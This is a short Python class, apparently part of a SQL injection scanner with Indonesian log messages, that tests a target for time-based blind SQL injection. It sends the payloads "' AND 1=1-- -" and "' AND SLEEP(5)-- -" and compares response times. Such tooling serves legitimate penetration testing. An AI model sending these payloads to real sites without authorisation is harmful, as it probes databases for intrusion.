class TimeBased:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args

    def run(self):
        base = self.req.get_time("' AND 1=1-- -")
        sleep = self.req.get_time("' AND SLEEP(5)-- -")
        if sleep - base > 4:
            self.logger.success("Time-based work")
        else:
            self.logger.info("Time-based tidak work")
